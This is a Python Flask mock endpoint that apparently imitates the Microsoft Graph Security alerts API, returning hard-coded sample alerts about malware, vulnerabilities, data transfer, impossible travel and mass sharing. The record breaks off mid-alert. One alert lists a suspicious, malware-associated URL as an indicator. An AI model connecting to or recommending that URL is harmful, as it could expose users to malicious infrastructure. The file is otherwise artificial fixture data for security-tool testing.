from flask import Blueprint, request
import json
import logging

BASE_URL = '/security/'.strip('/')
INTEGRATION = 'msgraphsecurity_api'

msgraphsecurity_api = Blueprint(f'{INTEGRATION}', __name__)
logger = logging.getLogger(__name__)

@msgraphsecurity_api.route(f'/{BASE_URL}/test')
def test():
    return {'result': 'it works'}


@msgraphsecurity_api.route(f'/{BASE_URL}/alerts')
def get_alerts():
    result = [{
    "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#Security/alerts",
    "value": [
        {
            "id": "8B9A013D-4079-4B20-9014-0B9DCB558455",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [
                "endpoint"
            ],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "vulnerability",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-23T15:58:31Z",
            "description": "Vulnerability detected: Microsoft Windows Shell Validation Remote Code Execution Vulnerability",
            "detectionIds": [],
            "eventDateTime": "2020-05-23T15:58:31Z",
            "feedback": "unknown",
            "lastModifiedDateTime": "2020-05-23T15:58:31Z",
            "recommendedActions": [],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "threat: vulnerability 35993",
            "vendorInformation": {
                "provider": "Palo Alto Networks",
                "providerVersion": "8.1",
                "subProvider": "NGFW",
                "vendor": "Palo Alto Networks"
            },
            "cloudAppStates": [
                {
                    "destinationServiceIp": "null",
                    "destinationServiceName": "null",
                    "riskScore": "4"
                }
            ],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "61.23.79.168",
                    "destinationDomain": "null",
                    "destinationPort": "80",
                    "destinationUrl": "null",
                    "direction": "null",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "tcp",
                    "riskScore": "null",
                    "sourceAddress": "10.154.246.167",
                    "sourcePort": "9475",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [
                {
                    "name": "networkConnection.sourceAddresss",
                    "type": "string",
                    "value": "10.154.246.167"
                }
            ],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "christiec",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "",
                    "logonIp": "null",
                    "logonLocation": "",
                    "logonType": "unknown",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "",
                    "userAccountType": "unknown",
                    "userPrincipalName": "christiec@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "BC9DBC0C-A72E-4F65-A197-A333318CA14E",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "threat",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-23T15:33:15Z",
            "description": "Traps: Malware Blocked",
            "detectionIds": [],
            "eventDateTime": "2020-05-23T15:33:15Z",
            "feedback": "unknown",
            "lastModifiedDateTime": "2020-05-23T15:33:15Z",
            "recommendedActions": [],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Traps: Malware Blocked",
            "vendorInformation": {
                "provider": "Palo Alto Networks",
                "providerVersion": "5.0",
                "subProvider": "Traps",
                "vendor": "Palo Alto Networks"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "fas21e1d90a",
                    "path": "/mnt",
                    "riskScore": "",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "linux-client129",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "",
                    "os": "null",
                    "privateIpAddress": "10.8.122.12",
                    "publicIpAddress": "",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "54.243.225.218",
                    "destinationDomain": "null",
                    "destinationPort": "3712",
                    "destinationUrl": "null",
                    "direction": "null",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "tcp",
                    "riskScore": "null",
                    "sourceAddress": "10.8.122.12",
                    "sourcePort": "7291",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "5AE9CC76-B587-4401-95C7-A8C878B7FFA5",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "threat",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-23T15:11:31Z",
            "description": "Traps: Malware Blocked",
            "detectionIds": [],
            "eventDateTime": "2020-05-23T15:58:31Z",
            "feedback": "unknown",
            "lastModifiedDateTime": "2020-05-23T15:11:31Z",
            "recommendedActions": [],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Traps: Malware Blocked",
            "vendorInformation": {
                "provider": "Palo Alto Networks",
                "providerVersion": "5.0",
                "subProvider": "Traps",
                "vendor": "Palo Alto Networks"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "file.bin",
                    "path": "/tmp",
                    "riskScore": "",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "linux-client131",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "",
                    "os": "null",
                    "privateIpAddress": "10.8.122.32",
                    "publicIpAddress": "",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "54.243.225.218",
                    "destinationDomain": "null",
                    "destinationPort": "3712",
                    "destinationUrl": "null",
                    "direction": "null",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "tcp",
                    "riskScore": "null",
                    "sourceAddress": "10.8.122.32",
                    "sourcePort": "8371",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "adamw",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "",
                    "logonIp": "null",
                    "logonLocation": "",
                    "logonType": "unknown",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "",
                    "userAccountType": "unknown",
                    "userPrincipalName": "adamw@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "53C7E3B0-8470-424C-BD40-2C9C3F9EFB81",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "data",
            "closedDateTime": "null",
            "comments": [
                ""
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-20T10:16:36Z",
            "description": "Data Filtering Alert: Document labelled Confidential file transfer detected",
            "detectionIds": [],
            "eventDateTime": "2020-05-20T10:16:36Z",
            "feedback": "TruePositive",
            "lastModifiedDateTime": "2020-05-20T10:16:36Z",
            "recommendedActions": [],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Data Filtering Alert",
            "vendorInformation": {
                "provider": "Palo Alto Networks",
                "providerVersion": "null",
                "subProvider": "NG Firewall",
                "vendor": "Palo Alto Networks"
            },
            "cloudAppStates": [
                {
                    "destinationServiceIp": "null",
                    "destinationServiceName": "null",
                    "riskScore": "4"
                }
            ],
            "fileStates": [
                {
                    "name": "upload_web_file_block",
                    "path": "null",
                    "riskScore": "null",
                    "fileHash": "null"
                }
            ],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "null",
                    "domainName": "null",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "null"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "D3EC9E2C-29A2-4DD3-9E1E-068C9B022938",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "data",
            "closedDateTime": "null",
            "comments": [
                ""
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-19T10:16:31Z",
            "description": "Data Filtering Alert: Document labeled Confidential file transfer detected",
            "detectionIds": [],
            "eventDateTime": "2020-05-19T10:16:31Z",
            "feedback": "unknown",
            "lastModifiedDateTime": "2020-05-19T10:16:31Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "dismissed",
            "title": "Data Filtering Alert",
            "vendorInformation": {
                "provider": "Palo Alto Networks",
                "providerVersion": "8.1",
                "subProvider": "NGFW",
                "vendor": "Palo Alto Networks"
            },
            "cloudAppStates": [
                {
                    "destinationServiceIp": "null",
                    "destinationServiceName": "null",
                    "riskScore": "4"
                }
            ],
            "fileStates": [
                {
                    "name": "upload_web_file_block",
                    "path": "",
                    "riskScore": "",
                    "fileHash": "null"
                }
            ],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "162.125.3.6",
                    "destinationDomain": "null",
                    "destinationPort": "443",
                    "destinationUrl": "null",
                    "direction": "null",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "tcp",
                    "riskScore": "null",
                    "sourceAddress": "192.168.132.73",
                    "sourcePort": "9475",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "",
                    "logonIp": "null",
                    "logonLocation": "",
                    "logonType": "unknown",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "",
                    "userAccountType": "unknown",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "05BD5D80-3385-49D5-BEE4-4E439F9C0071",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [
                "endpoint"
            ],
            "activityGroupName": "null",
            "assignedTo": "analyst@M365x594651.onmicrosoft.com",
            "category": "network",
            "closedDateTime": "null",
            "comments": [
                "Under investigatiopn",
                "found evidence of malware"
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-19T09:05:37Z",
            "description": "The host lap-douglasf created a network connection to a suspicious URL http[:]//willaimsclarke.com/lee/fre.php",
            "detectionIds": [],
            "eventDateTime": "2020-05-19T09:05:21Z",
            "feedback": "TruePositive",
            "lastModifiedDateTime": "2020-05-19T09:05:37Z",
            "recommendedActions": [],
            "severity": "informational",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Palo Alto NG Firewall detected a network connection to a suspicious URL",
            "vendorInformation": {
                "provider": "Palo Alto Networks",
                "providerVersion": "8.1",
                "subProvider": "NG Firewall",
                "vendor": "Palo Alto Networks"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "lap-douglasf365x594651.onmicrosoft.com",
                    "isAzureAdJoined": False,
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "lap-douglasf",
                    "os": "Windows10",
                    "privateIpAddress": "10.8.198.11",
                    "publicIpAddress": "172.16.37.125",
                    "riskScore": "null"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "54.243.225.218",
                    "destinationDomain": "willaimsclarke.com",
                    "destinationPort": "80",
                    "destinationUrl": "http://willaimsclarke.com/lee/fre.php",
                    "direction": "outbound",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "tcp",
                    "riskScore": "null",
                    "sourceAddress": "null",
                    "sourcePort": "null",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [
                {
                    "name": "networkConnections.destinationUrl",
                    "type": "string",
                    "value": "http://willaimsclarke.com/lee/fre.php"
                }
            ],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "399796F2-9395-49B2-A6AB-9E02162313D8",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [
                "endpoint"
            ],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "wildfire",
            "closedDateTime": "null",
            "comments": [
                ""
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-18T19:26:59Z",
            "description": "Wildfire prevention event block",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T19:26:59Z",
            "feedback": "unknown",
            "lastModifiedDateTime": "2020-05-18T19:26:59Z",
            "recommendedActions": [],
            "severity": "high",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Wildfire prevention threat",
            "vendorInformation": {
                "provider": "Palo Alto Networks",
                "providerVersion": "8.1",
                "subProvider": "NG Firewall",
                "vendor": "Palo Alto Networks"
            },
            "cloudAppStates": [
                {
                    "destinationServiceIp": "null",
                    "destinationServiceName": "null",
                    "riskScore": "4"
                }
            ],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "42.11.23.51",
                    "destinationDomain": "null",
                    "destinationPort": "80",
                    "destinationUrl": "null",
                    "direction": "null",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "tcp",
                    "riskScore": "null",
                    "sourceAddress": "10.154.9.40",
                    "sourcePort": "25895",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [
                {
                    "name": "networkConnection.sourceAddress",
                    "type": "string",
                    "value": "10.154.9.40"
                }
            ],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com/malware",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "",
                    "logonIp": "null",
                    "logonLocation": "",
                    "logonType": "unknown",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "",
                    "userAccountType": "unknown",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "02064FE6-F5F0-43FF-BA16-79C21F6D8D43",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "impossibleLoginVelocity",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-20T18:30:45Z",
            "description": "The user Douglas Fife (douglasf@M365x594651.onmicrosoft.com)\" performed an impossible travel activity. The user was active from 131.107.159.34 in Washington, US and 31.154.212.66 in Rosh Haayin, Hamerkaz, IL within 55 minutes. Additional risks in this user session: 131.107.159.34 was used for the first time in 268 days by this user. 191d5be7-f855-4d22-b8d0-bdb8ba7ccd7a was accessed for the first time in 268 days by this user.",
            "detectionIds": [],
            "eventDateTime": "2020-05-20T18:30:40Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-20T18:30:45Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Impossible travel activity",
            "vendorInformation": {
                "provider": "Cloud Application Security",
                "providerVersion": "3.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "131.107.159.34",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "E21C584F-EA0B-34D9-8DD6-4DABF442A232",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "",
            "assignedTo": "",
            "category": "repeatedShareActivity",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-20T14:33:00Z",
            "description": "The user \"Douglas Fife@M365x594651.onmicrosoft.com)\" shared over 11,250 unique objects in a single session.",
            "detectionIds": [],
            "eventDateTime": "2020-05-20T13:34:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-20T14:33:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Mass share",
            "vendorInformation": {
                "provider": "Cloud Application Security",
                "providerVersion": "3.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "809A30D5-6626-4EB2-A055-8FA274DB2DF5",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "analyst@M365x594651.onmicrosoft.com",
            "category": "repeatedActivityShare",
            "closedDateTime": "null",
            "comments": [
                "Beginning investigation",
                "Contacted user - denies sharing this large number of files"
            ],
            "confidence": 0,
            "createdDateTime": "2020-05-19T16:55:36Z",
            "description": "The user Douglas Fife (douglasf@M365x594651.onmicrosoft.com)\" shared over 11,250 unique objects in a single session.",
            "detectionIds": [],
            "eventDateTime": "2020-05-19T16:02:56Z",
            "feedback": "TruePositive",
            "lastModifiedDateTime": "2020-05-19T16:55:36Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Mass share",
            "vendorInformation": {
                "provider": "Cloud Application Security",
                "providerVersion": "3.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "F5295FF7-C6DF-49B7-B6BF-4C298D5A7510",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "repeatedShareActivity",
            "closedDateTime": "null",
            "comments": [
                ""
            ],
            "confidence": 0,
            "createdDateTime": "2020-05-18T21:22:00Z",
            "description": "The user \"Aldo Muller (aldom@M365x594651.onmicrosoft.com)\" shared over 11,250 unique objects in a single session. Additional risks in this user session: Microsoft Exchange Online was accessed from 2642:111:5033:20c:e120:196b:b099:bfcd for the first time in 252 days.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T19:21:00Z",
            "feedback": "TruePositive",
            "lastModifiedDateTime": "2020-05-18T19:22:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Mass share",
            "vendorInformation": {
                "provider": "Cloud Application Security",
                "providerVersion": "3.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "9092165B-6260-31B5-A242-7244681BC659",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "repeatedActivityShare",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T17:10:00Z",
            "description": "The user \"Patti Fernandez (pattif@M365x594651.onmicrosoft.com)\" shared over 11,250 unique objects in a single session. Additional risks in this user session: Microsoft Exchange Online was accessed from 2620:119:5003:20c:e140:196b:b099:bfca for the first time in 252 days.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T15:52:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T17:10:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Mass share",
            "vendorInformation": {
                "provider": "Cloud Application Security",
                "providerVersion": "3.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "pattif",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "pattif@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "BA386FB7-1DE1-3574-A4A3-C46058123001",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "loginVelocity",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T16:59:00Z",
            "description": "The user \"Patti Fernandez (pattif@M365x594651.onmicrosoft.com)\" performed an impossible travel activity. The user was active from 167.220.2.9 in Kirkland, Washington, US and 167.220.232.240 in Midori-Ku (Saitama), Saitama, JP within 55 minutes. Additional risks in this user session: 167.220.2.9 was used for the first time in 268 days by this user. 191d5be7-f855-4d22-b8d0-bdb8ba7ccd7a was accessed for the first time in 268 days by this user.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T15:43:33Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T16:59:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Impossible travel activity",
            "vendorInformation": {
                "provider": "Cloud Application Security",
                "providerVersion": "3.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "pattif",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "pattif@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "674B4B45-3EAD-3E24-B615-367DD1D487C0",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "",
            "assignedTo": "",
            "category": "riskyAnonymousIp",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-17T15:51:00Z",
            "description": "The anonymous proxy IP address 74.208.217.160 was accessed by \"Aldo Muller (aldom@M365x594651.onmicrosoft.com)\". Additional risks in this user session: 74.208.217.160 was used for the first time in 268 days in your organization.",
            "detectionIds": [],
            "eventDateTime": "2020-05-17T15:44:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-17T15:51:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Activity from an anonymous proxy",
            "vendorInformation": {
                "provider": "Cloud Application Security",
                "providerVersion": "3.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "aldom",
                    "domainName": "null",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "F3B778B4-9539-49E9-B22F-7E6972856388",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "unfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-19T10:03:55Z",
            "description": "User logged in from a new unfamiliar location based on user's past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-19T10:03:43Z",
            "feedback": "null",
